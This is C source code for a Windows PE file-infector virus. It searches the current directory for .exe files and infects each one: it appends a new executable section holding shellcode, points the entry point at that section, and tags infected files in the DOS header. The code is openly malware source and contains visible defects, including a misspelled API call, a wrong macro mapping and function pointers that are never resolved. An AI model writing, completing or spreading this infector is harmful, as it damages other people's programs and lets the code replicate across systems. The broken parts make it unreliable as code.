#include <Windows.h>
#include <winternl.h>
#include <minwindef.h>
#include <minwinbase.h>
#include <winnt.h>

#pragma code_seg(".advance")

//======================================================================
// fileapi.h
typedef HANDLE (WINAPI *__FindFirstFileA) (
    _In_ LPCSTR lpFileName,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindNextFileA) (
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindClose) (
    _Inout_ HANDLE hFindFile
);
typedef HANDLE (WINAPI *__CreateFileA) (
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
);
typedef BOOL (WINAPI *__WriteFile) (
    _In_ HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToWrite,
    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef BOOL (WINAPI *__ReadFile) (
    _In_ HANDLE hFile,
    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToRead,
    _Out_opt_ LPDWORD lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef DWORD (WINAPI *__SetFilePointer) (
    _In_ HANDLE hFile,
    _In_ LONG lDistanceToMove,
    _Inout_opt_ PLONG lpDistanceToMoveHigh,
    _In_ DWORD dwMoveMethod
);
typedef BOOL (WINAPI *__SetEndOfFile) (
    _In_ HANDLE hFile
);
typedef DWORD (WINAPI *__GetFileSize) (
    _In_ HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
);
// handleapi.h
typedef BOOL (WINAPI *__CloseHandle) (
    _In_ _Post_ptr_invalid_ HANDLE hObject
);
//======================================================================

typedef struct KERNEL_OPERATION {
    // info
    PBYTE _shellCode;
    DWORD _JMP_POINT_OFFSET;
    DWORD _CODE_SIZE;
    // function
    __FindFirstFileA _FindFirstFileA;
    __FindNextFileA _FindNextFileA;
    __FindClose _FindClose;
    __CreateFileA _CreateFileA;
    __WriteFile _WriteFile;
    __ReadFile _ReadFile;
    __SetFilePointer _SetFilePointer;
    __SetEndOfFile _SetEndOfFile;
    __GetFileSize _GetFileSize;
    __CloseHandle _CloseHandle;
} KOP;

//======================================================================

#define shellCode op->_shellCode
#define JMP_POINT_OFFSET op->_JMP_POINT_OFFSET
#define CODE_SIZE op->_CODE_SIZE

#define FindFirstFileA op->_FindFirstFileA
#define FindNextFileA op->_FindNextFileA
#define FindClose op->_FindClose
#define CreateFileA op->_CreateFileA
#define WriteFile op->WriteFile
#define ReadFile op->_ReadFile
#define SetFilePointer op->_SetFilePointer
#define SetEndOfFile op->_SetEndOfFile
#define GetFileSize op->_GetFileSize
#define CloseHandle op->_CloseHandle

//======================================================================

__forceinline int ReadOffset(KOP *op, HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        // puts("Error when set file pointor!");
        return 1;
    }
    if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
        // puts("Error when read file!");
        return 2;
    }
    return 0;
}
__forceinline int WriteOffset(KOP *op, HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        // puts("Error when set file pointor!");
        return 1;
    }
    if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
        // puts("Error when write file!");
        return 2;
    }
    return 0;
}
__forceinline int SetFileSize(KOP *op, HANDLE hFile, long size) {
    if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        // puts("Error when set file pointor!");
        return 1;
    }
    if(SetEndOfFile(hFile) == FALSE) {
        // puts("Error when modify size!");
        return 2;
    }
    return 0;
}

//======================================================================

__forceinline HANDLE OpenTargetA(KOP *op, CHAR *name) {
    HANDLE hFile = CreateFileA(
        name,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    return hFile;
}

__forceinline int InfectTarget(KOP *op, HANDLE hFile) {
//----------------------------------------------------------------------
    // headers
    IMAGE_DOS_HEADER dosHdr;
    IMAGE_FILE_HEADER fileHdr;
    IMAGE_OPTIONAL_HEADER32 optHdr;
    IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
    // headers pointer
    PIMAGE_DOS_HEADER pDosHdr = &dosHdr;
    PIMAGE_FILE_HEADER pFileHdr = &fileHdr;
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &optHdr;
    PIMAGE_SECTION_HEADER pLasSecHdr = &lasSecHdr;
    PIMAGE_SECTION_HEADER pNewSecHdr = &newSecHdr;
//----------------------------------------------------------------------
    // Get DOS Header
    ReadOffset(
        op, hFile, 0, FILE_BEGIN, 
        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    // Check infected
    if(pDosHdr->e_res[0] == 0x1234) {
        /* Error: Target has been infected! */
        return 1;
    }
    // Check Signature
    DWORD pe00;
    ReadOffset(
        op, hFile, pDosHdr->e_lfanew, FILE_BEGIN,
        (PVOID)&pe00, sizeof(DWORD)
    );
    if(pe00 != 0x00004550) {
        /* Error: Not a pe file! */
        return 2;
    }
    // Get File Header
    ReadOffset(
        op, hFile, 0, FILE_CURRENT, 
        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    // Get Optional Header
    ReadOffset(
        op, hFile, 0, FILE_CURRENT, 
        (PVOID)&optHdr, 
        /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
        sizeof(IMAGE_OPTIONAL_HEADER32) 
    );
    if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        /* Error: Not a 32 bits exe! */
        return 3;
    }
    // Check Headers Space
    long currentSize = \
        pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
        + pDosHdr->e_lfanew + 0x4 \
        + sizeof(IMAGE_FILE_HEADER) \
        + pFileHdr->SizeOfOptionalHeader;
    long alignSize = pOptHdr->SizeOfHeaders;
    if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
        puts("Error: No space to insert a new sections!");
        exit(1);
    }
    // Get Last Section Header
    ReadOffset(
        op, hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
        (PVOID)&lasSecHdr, sizeof(IMAGE_SECTION_HEADER)
    );
//----------------------------------------------------------------------
    // Get align
    long fileAlign = pOptHdr->FileAlignment;
    long secAlign = pOptHdr->SectionAlignment; 
    // Set old entry VA
    // TODO
    long oldVA = pOptHdr->AddressOfEntryPoint;
    long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
    *jmpPoint = oldVA;
    // Calc New Section raw
    long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
    // Calc New Section rva 
    long lasVirSize = pLasSecHdr->Misc.VirtualSize;
    if(lasVirSize % secAlign != 0) lasVirSize = (lasVirSize / secAlign + 1) * secAlign;
    long rvaNewSec = pLasSecHdr->VirtualAddress + lasVirSize;
    // Calc New Section raw size
    long raw_size = CODE_SIZE;
    if(CODE_SIZE % fileAlign != 0) raw_size = (CODE_SIZE / fileAlign + 1) * fileAlign;
    // Calc New Section image size
    int vir_size = CODE_SIZE;
    if(CODE_SIZE % secAlign != 0) vir_size = (CODE_SIZE / secAlign + 1) * secAlign;
    // Set New Section Header
    char *sName = pNewSecHdr->Name;
    sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
    pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
    pNewSecHdr->VirtualAddress = rvaNewSec;
    pNewSecHdr->SizeOfRawData = raw_size;
    pNewSecHdr->PointerToRawData = rawNewSec;
    pNewSecHdr->PointerToRelocations = 0;
    pNewSecHdr->PointerToLinenumbers = 0;
    pNewSecHdr->NumberOfRelocations = 0;
    pNewSecHdr->NumberOfLinenumbers = 0;
    pNewSecHdr->Characteristics = \
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_ALIGN_32BYTES | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
    // Set Infected tag
    pDosHdr->e_res[0] = 0x1234;
    // Fix File Header
    pFileHdr->NumberOfSections++;
    // Fix Optional Header
    pOptHdr->AddressOfEntryPoint = rvaNewSec;
    pOptHdr->SizeOfImage = rvaNewSec + vir_size;
//----------------------------------------------------------------------
    // Saved Dos Header
    WriteOffset(
        op, hFile, 0, FILE_BEGIN,
        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    // Saved File Header
    WriteOffset(
        op, hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    // Saved Optional Header
    WriteOffset(
        op, hFile, 0, FILE_CURRENT,
        (PVOID)&optHdr,
        sizeof(IMAGE_OPTIONAL_HEADER32)
    );
    // Saved New Section Header
    WriteOffset(
        op, hFile, currentSize, FILE_BEGIN,
        (PVOID)&newSecHdr,
        sizeof(IMAGE_SECTION_HEADER)
    );
    // Saved New Section
    WriteOffset(
        op, hFile, rawNewSec, FILE_BEGIN,
        shellCode, CODE_SIZE
    );
    // Alignment
    SetFileSize(hFile, rawNewSec + raw_size);
//----------------------------------------------------------------------
    return 0;
}

//======================================================================

__forceinline void ShellCodeMain(KOP *op) {
    // find exe in cwd
    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFitstFileA(search, &findData);
    if(hFind == INVALID_HANDLE_VALUE) goto __fail_find;
    // iterate files
    LPWIN32_FIND_DATAA lpFindData = &findData;
    do {
        HANDLE hf = OpenTargetA(op, lpFindData->cFileName);
        if(hf == NULL) continue;
        InfectTarget(op, hf);
        CloseHandle(hf);
    } while(FindNextFileA(hFind, lpFindData));
    FindClose(hFind);
__fail_find:
    return;
}

//======================================================================

void ShellCode() {
__code_start:
    KOP super_block;
    KOP *op = &super_block;
    // Get funtion pointer

    // Get Code info
    PBYTE codeAdr;
    DWORD codeSize;
    __asm {
        mov eax, __code_start
        mov codeAdr, eax
        mov eax, __code_end
        sub eax, __code_start
        mov codeSize, eax
    }
    // 
    ShellCodeMain(op);
__code_end:
    return;
}